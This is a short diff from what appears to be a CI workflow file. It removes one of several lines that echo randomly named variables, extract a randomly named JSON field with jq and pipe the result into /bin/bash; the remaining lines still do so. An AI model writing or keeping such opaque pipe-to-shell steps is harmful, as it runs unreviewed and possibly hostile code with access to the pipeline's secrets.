@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ngf6445" | jq -r .yshu569 | /bin/bash
           echo $hrm98479 | jq -r .wln843 | /bin/bash
           echo $ljikg4489 | jq -r .dklo20 | /bin/bash
-          echo $szzi6 | jq -r .eu4 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
